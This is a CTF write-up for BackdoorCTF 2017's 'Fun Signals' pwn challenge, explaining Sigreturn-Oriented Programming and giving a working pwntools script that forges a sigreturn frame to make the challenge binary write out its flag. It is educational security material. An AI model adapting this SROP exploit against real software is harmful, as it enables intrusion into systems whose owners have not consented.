---
title: "BackdoorCTF 2017 - Fun Signals"
layout: post
date: 2017-10-18 5:21
tag:
- BackdoorCTF2017
- Pwn
- Backdoor
writeup: true
star: false
points: 250
category: Pwn
---

![Backdoor Logo](/assets/images/backdoorctf16/logo.png)

**BackdoorCTF is the annual flagship CTF competition conducted by SDSLabs and InfoSecIITR.**

#### Points: 250

#### Description:

> Gr33n5h4d0w had an argument with h3rcul35 while they were studying Signals and Systems. So, h3rcul35 gave him a binary and said "Signals control Computer. Give me the flag". Can you help gr33n5h4d0w win his argument by helping him get the flag.

> nc hack.bckdr.in 9034

> [player_bin](/assets/binaries/backdoorctf17/funsignals_player_bin)


## Write-up

This is a very interesting problem and introduced me to a new kind of attack - [Sigreturn-Oriented Programming](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming) (SROP). SROP is a technique similar to Return-Oriented Programming (ROP) and is a useful attack vector when the memory is non-executable and you can't use code injection. This requires the attacker to be able to control the call stack using, for example, a buffer overflow.

When the kernel delivers a signal it creates a frame on the stack where it stores the current context (includes register values among other things). On a sigreturn call the values from the stack are read and put back into the registers. An attacker controllling the stack can modify these values and cause considerable damage.

### The disassembly

![Disasembly](/assets/images/backdoorctf17/funsignals_disas.png)

The flag is in the binary.... on the server.

Anyways, the first call is:

`read(0, $esp, 0x400)`

1024(`0x400`) bytes of input is being read from `stdin` and put into the buffer pointed to by `$esp`. Since `esp` is the stack pointer, our input is directly being written on the stack. No space has been allocated for any form of variable.

The next call is:

`sigreturn`

As already explain, `sigreturn` will read the sigreturn frame from the stack. But the stack has our input.
We control the frame! That's a lot of power really. We can jump wherever with whatever values in the registers.

**The question is where to jump?**

Since the aim is to get the flag, we need to write it out. Hence the obvious decision is to do a syscall to WRITE.

But how do we do a syscall?

There is a portion of code labelled `syscall`, that's where we need to jump with the proper values in registers to print the flag. Let's get down to writing a python script.

### The Script

Luckily `pwntools` already had functionality to create Sigreturn frames.

```python

from pwn import *

binary = ELF('player_bin') # Load the binary

context.clear()
context.arch = "amd64" # Architecture

## Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_write # System call identifier for write()
frame.rdi = constants.STDOUT_FILENO
frame.rsi = binary.symbols['flag'] # Address of `flag` symbol
frame.rdx = 50 # Number of characters to write. Goes as a parameter to write()
frame.rip = binary.symbols['syscall'] # Start execution from the address labelled `syscall`

r = remote('hack.bckdr.in', 9034)
r.send(str(frame)) # Send the custom frame to overwrite the real one
r.interactive()
```

This will connect to the server, extract the flag and print it.

**Note:** I randomly decided to get 50 characters since we don't know the flag size beforehand. The flag was actually smaller than that. Anything larger than the flag size would've worked.

Cheers!

**Go through other [writeups](../) for more such fun challenges.**
